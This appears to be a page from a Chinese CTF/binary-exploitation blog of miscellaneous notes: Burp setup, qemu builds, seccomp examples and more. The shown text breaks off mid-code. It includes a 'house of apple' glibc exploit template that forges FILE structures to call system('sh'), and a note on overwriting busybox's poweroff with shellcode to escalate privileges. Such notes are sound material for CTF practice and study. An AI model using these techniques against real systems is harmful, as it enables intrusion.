<!DOCTYPE html>
<html lang="zh-CN">
    <head>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="robots" content="noodp" />
        <title>疑难杂症宝典 - cnitlrtの博客</title><meta name="Description" content="记录一些遇到的疑难杂症"><meta property="og:title" content="疑难杂症宝典" />
<meta property="og:description" content="记录一些遇到的疑难杂症" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://cnitlrt.github.io/misc/" /><meta property="og:image" content="https://cnitlrt.github.io/logo.jpg"/><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2022-01-01T04:06:14+08:00" />
<meta property="article:modified_time" content="2023-11-26T01:18:38+08:00" /><meta property="og:site_name" content="My cool site" />
<meta name="twitter:card" content="summary_large_image"/>
<meta name="twitter:image" content="https://cnitlrt.github.io/logo.jpg"/>

<meta name="twitter:title" content="疑难杂症宝典"/>
<meta name="twitter:description" content="记录一些遇到的疑难杂症"/>
<meta name="application-name" content="LoveIt">
<meta name="apple-mobile-web-app-title" content="LoveIt"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://cnitlrt.github.io/misc/" /><link rel="next" href="https://cnitlrt.github.io/qwb2021/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
        <noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css"></noscript><link rel="preload" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
        <noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css"></noscript><script type="application/ld+json">
    {
        "@context": "http://schema.org",
        "@type": "BlogPosting",
        "headline": "疑难杂症宝典",
        "inLanguage": "zh-CN",
        "mainEntityOfPage": {
            "@type": "WebPage",
            "@id": "https:\/\/cnitlrt.github.io\/misc\/"
        },"image": [{
                            "@type": "ImageObject",
                            "url": "https:\/\/cnitlrt.github.io\/images\/Apple-Devices-Preview.png",
                            "width":  3200 ,
                            "height":  2048 
                        }],"genre": "posts","keywords": "tools","wordcount":  16993 ,
        "url": "https:\/\/cnitlrt.github.io\/misc\/","datePublished": "2022-01-01T04:06:14+08:00","dateModified": "2023-11-26T01:18:38+08:00","license": "This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.","publisher": {
            "@type": "Organization",
            "name": "xxxx","logo": {
                    "@type": "ImageObject",
                    "url": "https:\/\/cnitlrt.github.io\/images\/avatar.jpg",
                    "width":  1080 ,
                    "height":  1080 
                }},"author": {
                "@type": "Person",
                "name": "cnitlrt"
            },"description": "记录一些遇到的疑难杂症"
    }
    </script></head>
    <body data-header-desktop="fixed" data-header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>

        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
    <div class="header-wrapper">
        <div class="header-title">
            <a href="/" title="cnitlrtの博客"><span class="header-title-pre"><i class='far fa-kiss-wink-heart fa-fw'></i></span><span id="id-1" class="typeit"></span></a>
        </div>
        <div class="menu">
            <div class="menu-inner"><a class="menu-item" href="/posts/"> 所有文章 </a><a class="menu-item" href="/tags/"> 标签 </a><a class="menu-item" href="/categories/"> 分类 </a><a class="menu-item" href="/about/"> 关于 </a><a class="menu-item" href="https://github.com/cnitlrt" title="GitHub" rel="noopener noreffer" target="_blank"><i class='fab fa-github fa-fw'></i> Github </a><a class="menu-item" href="/friend/"> 友链 </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
                        <input type="text" placeholder="搜索文章标题或内容..." id="search-input-desktop">
                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="搜索">
                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
                        </a>
                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="清空">
                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
                        </a>
                        <span class="search-button search-loading" id="search-loading-desktop">
                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
                        </span>
                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="切换主题">
                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
                </a></div>
        </div>
    </div>
</header><header class="mobile" id="header-mobile">
    <div class="header-container">
        <div class="header-wrapper">
            <div class="header-title">
                <a href="/" title="cnitlrtの博客"><span class="header-title-pre"><i class='far fa-kiss-wink-heart fa-fw'></i></span><span id="id-2" class="typeit"></span></a>
            </div>
            <div class="menu-toggle" id="menu-toggle-mobile">
                <span></span><span></span><span></span>
            </div>
        </div>
        <div class="menu" id="menu-mobile"><div class="search-wrapper">
                    <div class="search mobile" id="search-mobile">
                        <input type="text" placeholder="搜索文章标题或内容..." id="search-input-mobile">
                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="搜索">
                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
                        </a>
                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="清空">
                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
                        </a>
                        <span class="search-button search-loading" id="search-loading-mobile">
                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
                        </span>
                    </div>
                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
                        取消
                    </a>
                </div><a class="menu-item" href="/posts/" title="">所有文章</a><a class="menu-item" href="/tags/" title="">标签</a><a class="menu-item" href="/categories/" title="">分类</a><a class="menu-item" href="/about/" title="">关于</a><a class="menu-item" href="https://github.com/cnitlrt" title="GitHub" rel="noopener noreffer" target="_blank"><i class='fab fa-github fa-fw'></i>Github</a><a class="menu-item" href="/friend/" title="">友链</a><a href="javascript:void(0);" class="menu-item theme-switch" title="切换主题">
                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
            </a></div>
    </div>
</header><div class="search-dropdown desktop">
        <div id="search-dropdown-desktop"></div>
    </div>
    <div class="search-dropdown mobile">
        <div id="search-dropdown-mobile"></div>
    </div><main class="main">
                <div class="container"><div class="toc" id="toc-auto">
            <h2 class="toc-title">目录</h2>
            <div class="toc-content" id="toc-content-auto"></div>
        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">疑难杂症宝典</h1><div class="post-meta">
            <div class="post-meta-line"><span class="post-author"><a href="/" title="Author" rel="author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>cnitlrt</a></span>&nbsp;<span class="post-category">收录于 <a href="/categories/tools/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>tools</a></span></div>
            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2022-01-01">2022-01-01</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;约 16993 字&nbsp;
                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;预计阅读 34 分钟&nbsp;</div>
        </div><div class="details toc" id="toc-static"  data-kept="">
                <div class="details-summary toc-title">
                    <span>目录</span>
                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
                </div>
                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
  <ul>
    <li>
      <ul>
        <li>
          <ul>
            <li><a href="#ubuntu-bp安装">ubuntu bp安装</a></li>
            <li><a href="#ubuntu-bp抓不到包">ubuntu BP抓不到包</a></li>
          </ul>
        </li>
        <li><a href="#busybox找poweroff">busybox找poweroff</a></li>
        <li><a href="#house-of-apple板子">house of apple板子</a></li>
        <li><a href="#删除大文件">删除大文件</a></li>
        <li><a href="#qemu编译">qemu编译</a></li>
        <li><a href="#asan可以检测到内存泄露的几种方式">asan可以检测到内存泄露的几种方式</a></li>
        <li><a href="#vscode-常用扩展">vscode 常用扩展</a>
          <ul>
            <li><a href="#intellicode">intellicode</a></li>
            <li><a href="#tabnine">tabnine</a></li>
          </ul>
        </li>
        <li><a href="#安装ret-sync">安装ret-sync</a></li>
        <li><a href="#docker-gdbserver调试">docker gdbserver调试</a></li>
        <li><a href="#docker-image上传dockerhub">docker image上传dockerhub</a></li>
        <li><a href="#docker-build的时候使用代理">docker build的时候使用代理</a></li>
        <li><a href="#解包类的指令尽量不要在共享文件夹中使用">解包类的指令尽量不要在共享文件夹中使用！！！</a></li>
        <li><a href="#binwalk安装">binwalk安装</a></li>
        <li><a href="#hackmd">hackmd</a></li>
        <li><a href="#maze">maze</a></li>
        <li><a href="#hyper打开和关闭">hyper打开和关闭</a>
          <ul>
            <li><a href="#打开">打开</a></li>
            <li><a href="#关闭">关闭</a></li>
          </ul>
        </li>
        <li><a href="#v8相关">v8相关</a></li>
        <li><a href="#ens33网卡失效">ens33网卡失效</a>
          <ul>
            <li>
              <ul>
                <li><a href="#如果没有ifconfig">如果没有ifconfig</a></li>
              </ul>
            </li>
          </ul>
        </li>
        <li><a href="#airodump-使用">airodump 使用</a></li>
        <li><a href="#wifi钓鱼">wifi钓鱼</a></li>
        <li><a href="#出题相关">出题相关</a>
          <ul>
            <li><a href="#awd">awd</a></li>
            <li><a href="#dockerfile">Dockerfile</a></li>
            <li><a href="#ctfxinetd">ctf.xinetd</a></li>
            <li><a href="#stripsh">strip.sh</a></li>
            <li><a href="#startsh">start.sh</a></li>
          </ul>
        </li>
        <li><a href="#命令">命令</a></li>
        <li><a href="#afl工具使用">AFL工具使用</a>
          <ul>
            <li><a href="#afl-tmin">afl-tmin</a></li>
          </ul>
        </li>
        <li><a href="#linux调试版本不一致">linux调试版本不一致</a></li>
        <li><a href="#添加swap交换分区空间"><strong>添加swap交换分区空间</strong></a></li>
        <li><a href="#附删除swap交换分区"><strong>附：删除swap交换分区</strong></a></li>
        <li><a href="#解包">解包</a></li>
        <li><a href="#打包">打包</a></li>
        <li><a href="#取消byteswaring">取消byteswaring</a></li>
        <li><a href="#删除none镜像">删除none镜像</a></li>
        <li><a href="#一些系统调用">一些系统调用</a>
          <ul>
            <li><a href="#getdents">getdents</a></li>
            <li><a href="#connect">connect</a></li>
            <li><a href="#mmap">mmap</a></li>
            <li><a href="#openat">openat</a></li>
            <li><a href="#ptrace">ptrace</a></li>
            <li><a href="#arch_prctl">arch_prctl</a></li>
            <li><a href="#writev">writev</a></li>
            <li><a href="#prlimit">prlimit</a></li>
          </ul>
        </li>
        <li><a href="#idapython-常见指令">idapython 常见指令</a></li>
        <li><a href="#dump_elf32idc">dump_elf32.idc</a></li>
        <li><a href="#ida右键菜单打开">IDA右键菜单打开</a></li>
        <li><a href="#ubuntu加内存">ubuntu加内存</a></li>
        <li><a href="#虚拟机繁忙无法关机">虚拟机繁忙，无法关机</a></li>
        <li><a href="#python-显示某某decode不了或者encode不了">python 显示某某decode不了或者encode不了</a>
          <ul>
            <li><a href="#pwntools-使用">pwntools 使用</a></li>
          </ul>
        </li>
        <li><a href="#共享文件夹突然消失">共享文件夹突然消失</a></li>
        <li><a href="#编译32bit程序">编译32bit程序</a></li>
        <li><a href="#pwntools解决tmux-waiting-for-debugger">pwntools解决tmux waiting for debugger</a></li>
        <li><a href="#triton安装">Triton安装</a>
          <ul>
            <li><a href="#cmake版本太小">cmake版本太小</a></li>
            <li><a href="#缺少bitwuzla">缺少BITWUZLA</a></li>
            <li><a href="#capstone路径不对">capstone路径不对</a></li>
            <li><a href="#安装以后不能用">安装以后不能用</a></li>
          </ul>
        </li>
        <li><a href="#自用pwntools利用模板">自用pwntools利用模板</a>
          <ul>
            <li>
              <ul>
                <li><a href="#pwnupmako">pwnup.mako</a></li>
                <li><a href="#templatepy">template.py</a></li>
                <li><a href="#bubble">bubble</a></li>
              </ul>
            </li>
          </ul>
        </li>
        <li><a href="#zsh-corrupt-history-file-homexxxzsh_history">zsh: corrupt history file /home/XXX/.zsh_history</a></li>
        <li><a href="#hugo-博客搭建-windows">hugo 博客搭建 (windows)</a>
          <ul>
            <li>
              <ul>
                <li><a href="#安装">安装</a></li>
                <li><a href="#增加友链-所有的目录都在根目录">增加友链 （所有的目录都在根目录）</a>
                  <ul>
                    <li><a href="#增加菜单栏configtoml">增加菜单栏（config.toml）</a></li>
                    <li><a href="#创建html-xxxbloglayoutsshortcodes-创建friendhtml">创建html (xxx/blog/layouts/shortcodes/) 创建friend.html</a></li>
                    <li><a href="#css代码-assetscss_partial_signal新建_friendscss">css代码 (<code>assets/css/_partial/_signal</code>新建<code>_friend.scss</code>)</a></li>
                    <li><a href="#assetscss_page-下面新建-_singlescss-文件"><code>assets/css/_page/</code> 下面新建 <code>_single.scss</code> 文件</a></li>
                  </ul>
                </li>
                <li><a href="#增加加密功能">增加加密功能</a></li>
                <li><a href="#增加评论">增加评论</a>
                  <ul>
                    <li><a href="#network-error">network error</a></li>
                  </ul>
                </li>
                <li><a href="#配置github-action">配置github action</a></li>
                <li><a href="#更改网站图标">更改网站图标</a></li>
                <li><a href="#修改模板">修改模板</a></li>
                <li><a href="#解决-validation-failed">解决 Validation Failed.</a></li>
              </ul>
            </li>
          </ul>
        </li>
        <li><a href="#afl-qemu-32bit">AFL++ qemu 32bit</a></li>
        <li><a href="#powershell">powershell</a>
          <ul>
            <li>
              <ul>
                <li><a href="#字体">字体</a></li>
                <li><a href="#安装oh-my-poshposh-git和readline">安装oh-my-posh，posh-git和Readline</a></li>
                <li><a href="#修改配置文件">修改配置文件</a></li>
              </ul>
            </li>
          </ul>
        </li>
        <li><a href="#gdb调试相关">gdb调试相关</a>
          <ul>
            <li><a href="#父子进程调试">父子进程调试</a></li>
            <li><a href="#pwngdbpy">pwngdb.py</a></li>
          </ul>
        </li>
        <li><a href="#莫名奇妙的bug">莫名奇妙的bug</a></li>
        <li><a href="#woboq">woboq</a>
          <ul>
            <li><a href="#glibc">glibc</a>
              <ul>
                <li><a href="#glibc源码">glibc源码</a></li>
                <li><a href="#安装bear">安装bear</a></li>
                <li><a href="#安装woboq">安装woboq</a></li>
                <li><a href="#使用bear编译glibc源码-例如234">使用bear编译glibc源码 (例如2.34)</a></li>
                <li><a href="#解析">解析</a></li>
              </ul>
            </li>
            <li><a href="#woboq-afl">woboq afl</a>
              <ul>
                <li><a href="#生成compile_commandsjson文件">生成compile_commands.json文件</a></li>
                <li><a href="#解析-1">解析</a></li>
              </ul>
            </li>
          </ul>
        </li>
        <li><a href="#obfuscator-llvm">obfuscator-llvm</a>
          <ul>
            <li>
              <ul>
                <li><a href="#例子">例子</a></li>
                <li><a href="#开启控制流扁平化">开启控制流扁平化</a></li>
                <li><a href="#开启指令替换">开启指令替换</a></li>
                <li><a href="#开启虚假控制流">开启虚假控制流</a></li>
              </ul>
            </li>
          </ul>
        </li>
        <li><a href="#pwn题批量部署">pwn题批量部署</a></li>
        <li><a href="#ida静态编译符号表恢复">ida静态编译符号表恢复</a></li>
        <li><a href="#syzkaller环境搭建">syzkaller环境搭建</a></li>
        <li><a href="#linux-内核编译">linux 内核编译</a></li>
        <li><a href="#kernel相关">kernel相关</a>
          <ul>
            <li><a href="#常用命令">常用命令</a>
              <ul>
                <li><a href="#查看保护机制">查看保护机制</a></li>
                <li><a href="#查看slab">查看slab</a></li>
                <li><a href="#查看slab-1">查看slab</a></li>
                <li><a href="#查看最大文件打开数量">查看最大文件打开数量</a></li>
              </ul>
            </li>
            <li><a href="#pahole安装">pahole安装</a>
              <ul>
                <li><a href="#使用">使用</a></li>
              </ul>
            </li>
          </ul>
        </li>
        <li><a href="#挂载ptmx">挂载ptmx</a>
          <ul>
            <li><a href="#各种结构体">各种结构体</a>
              <ul>
                <li><a href="#user_key_payload">user_key_payload</a></li>
                <li><a href="#poll_list">poll_list</a></li>
                <li><a href="#msg_msg">msg_msg</a></li>
                <li><a href="#pipe_buffer">pipe_buffer</a></li>
                <li><a href="#sk_buffer">sk_buffer</a></li>
              </ul>
            </li>
          </ul>
        </li>
        <li><a href="#页表映射">页表映射</a></li>
      </ul>
    </li>
  </ul>
</nav></div>
            </div><div class="content" id="content"><h3 id="ubuntu-bp安装">ubuntu bp安装</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">sudo apt-get install openjdk-17-jdk
</span></span><span class="line"><span class="cl">sudo update-alternatives --config java
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="ubuntu-bp抓不到包">ubuntu BP抓不到包</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">主要针对firefox浏览器，打开about:config页面，搜索network.proxy.allow_hijacking_localhost双击变为true。
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="busybox找poweroff">busybox找poweroff</h2>
<ol>
<li>
<p>我们通过阅读busybox源码搜索poweroff可以看到如下的引用</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://s2.loli.net/2022/03/30/OdmzvbnqoXi43SK.png"
        data-srcset="https://s2.loli.net/2022/03/30/OdmzvbnqoXi43SK.png, https://s2.loli.net/2022/03/30/OdmzvbnqoXi43SK.png 1.5x, https://s2.loli.net/2022/03/30/OdmzvbnqoXi43SK.png 2x"
        data-sizes="auto"
        alt="https://s2.loli.net/2022/03/30/OdmzvbnqoXi43SK.png"
        title="https://s2.loli.net/2022/03/30/OdmzvbnqoXi43SK.png" /></p>
<p>并且可以看到如下关键字<code>/proc/meminfo</code>和<code>d:+nfwi</code>关键字，因此我们可以直接搜索这两个字符串即可</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://s2.loli.net/2022/03/30/B7EdLH2sIfOy8ox.png"
        data-srcset="https://s2.loli.net/2022/03/30/B7EdLH2sIfOy8ox.png, https://s2.loli.net/2022/03/30/B7EdLH2sIfOy8ox.png 1.5x, https://s2.loli.net/2022/03/30/B7EdLH2sIfOy8ox.png 2x"
        data-sizes="auto"
        alt="https://s2.loli.net/2022/03/30/B7EdLH2sIfOy8ox.png"
        title="https://s2.loli.net/2022/03/30/B7EdLH2sIfOy8ox.png" /></p>
</li>
</ol>
<p>可以看到该函数的偏移为5fdac8减去基地址400000可知偏移为0x1fdac8 + 1，因此便可以将该函数改为一段shellcode，然后输入exit即可提权</p>
<p>找到poweroff的偏移地址然后打poweroff</p>
<h2 id="house-of-apple板子">house of apple板子</h2>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">write_anywhere(stderr_addr + 104,p64(free_hook),stdin_addr)
</span></span><span class="line"><span class="cl">    payload = flat({
</span></span><span class="line"><span class="cl">        0:[u64(&#34;  sh;\x00\x00\x00&#34;)],
</span></span><span class="line"><span class="cl">    })
</span></span><span class="line"><span class="cl">    write_anywhere(free_hook,payload,stdin_addr)
</span></span><span class="line"><span class="cl">    write_anywhere(free_hook + 0x20,p64(0),stdin_addr)
</span></span><span class="line"><span class="cl">    write_anywhere(free_hook + 0x28,p64(1),stdin_addr)
</span></span><span class="line"><span class="cl">    write_anywhere(free_hook + 0xd8,p64(0x2160c0 + libc_base),stdin_addr)
</span></span><span class="line"><span class="cl">    write_anywhere(free_hook + 0xa0,p64(free_hook + 0x100),stdin_addr)
</span></span><span class="line"><span class="cl">    write_anywhere(free_hook + 0x100 + 0xe0,p64(free_hook+0x200),stdin_addr)
</span></span><span class="line"><span class="cl">    write_anywhere(free_hook + 0x200 + 0x68,p64(sys_addr),stdin_addr)
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">0-&gt;flags: u64(&#34;  sh;\x00\x00\x00&#34;)
</span></span><span class="line"><span class="cl">0x20-&gt;_IO_write_base: 0
</span></span><span class="line"><span class="cl">0x28-&gt;_IO_write_ptr: 1
</span></span><span class="line"><span class="cl">0xa0-&gt;_wide_data: 可控地址A
</span></span><span class="line"><span class="cl">0xd8-&gt;vtavle:_IO_wfile_jumps 可以调用_IO_wfile_overflow
</span></span><span class="line"><span class="cl">A+0xe0-&gt;_wide_vtable: 可控地址B
</span></span><span class="line"><span class="cl">B+0x68-&gt;_wide_data-&gt;_wide_vtable-&gt;doallocate: call func
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="删除大文件">删除大文件</h2>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">sudo du -h . --max-depth=1 | sort -hr | head -n 10
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="qemu编译">qemu编译</h2>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">wget https://download.qemu.org/qemu-8.0.5.tar.xz
</span></span><span class="line"><span class="cl">mkdir build
</span></span><span class="line"><span class="cl">cd build
</span></span><span class="line"><span class="cl">../configure --gdb=/usr/bin/gdb --enable-debug --prefix=/usr/local
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">## seccomp
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">```c
</span></span><span class="line"><span class="cl">//gcc -g simple_syscall_seccomp.c -o simple_syscall_seccomp -lseccomp
</span></span><span class="line"><span class="cl">#include &lt;unistd.h&gt;
</span></span><span class="line"><span class="cl">#include &lt;seccomp.h&gt;
</span></span><span class="line"><span class="cl">#include &lt;linux/seccomp.h&gt;
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">int main(void){
</span></span><span class="line"><span class="cl">	scmp_filter_ctx ctx;
</span></span><span class="line"><span class="cl">	ctx = seccomp_init(SCMP_ACT_ALLOW);
</span></span><span class="line"><span class="cl">    //seccomp_rule_add(ctx, SCMP_ACT_KILL, SCMP_SYS(execve),0);
</span></span><span class="line"><span class="cl">	seccomp_rule_add(ctx, SCMP_ACT_KILL, 59, 0);
</span></span><span class="line"><span class="cl">	seccomp_load(ctx);
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	char * filename = &#34;/bin/sh&#34;;
</span></span><span class="line"><span class="cl">	char * argv[] = {&#34;/bin/sh&#34;,NULL};
</span></span><span class="line"><span class="cl">	char * envp[] = {NULL};
</span></span><span class="line"><span class="cl">	write(1,&#34;i will give you a shell\n&#34;,24);
</span></span><span class="line"><span class="cl">	syscall(59,filename,argv,envp);//execve
</span></span><span class="line"><span class="cl">	return 0;
</span></span><span class="line"><span class="cl">}
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;sys/prctl.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;linux/filter.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;linux/seccomp.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">	
</span></span><span class="line"><span class="cl">	<span class="nf">prctl</span><span class="p">(</span><span class="n">PR_SET_NO_NEW_PRIVS</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">struct</span> <span class="n">sock_filter</span> <span class="n">sfi</span><span class="p">[]</span> <span class="o">=</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="p">{</span><span class="mh">0x20</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00000004</span><span class="p">},</span>
</span></span><span class="line"><span class="cl">        <span class="p">{</span><span class="mh">0x15</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x05</span><span class="p">,</span><span class="mh">0xc000003e</span><span class="p">},</span>
</span></span><span class="line"><span class="cl">        <span class="p">{</span><span class="mh">0x20</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00000000</span><span class="p">},</span>
</span></span><span class="line"><span class="cl">        <span class="p">{</span><span class="mh">0x35</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x01</span><span class="p">,</span><span class="mh">0x40000000</span><span class="p">},</span>
</span></span><span class="line"><span class="cl">        <span class="p">{</span><span class="mh">0x15</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x02</span><span class="p">,</span><span class="mh">0xffffffff</span><span class="p">},</span>
</span></span><span class="line"><span class="cl">        <span class="p">{</span><span class="mh">0x15</span><span class="p">,</span><span class="mh">0x01</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x0000003b</span><span class="p">},</span>
</span></span><span class="line"><span class="cl">        <span class="p">{</span><span class="mh">0x06</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x7fff0000</span><span class="p">},</span>
</span></span><span class="line"><span class="cl">        <span class="p">{</span><span class="mh">0x06</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00000000</span><span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">};</span>
</span></span><span class="line"><span class="cl">    <span class="k">struct</span> <span class="n">sock_fprog</span> <span class="n">sfp</span> <span class="o">=</span> <span class="p">{</span><span class="mi">8</span><span class="p">,</span> <span class="n">sfi</span><span class="p">};</span> <span class="c1">//这里8要和数据的行数一致
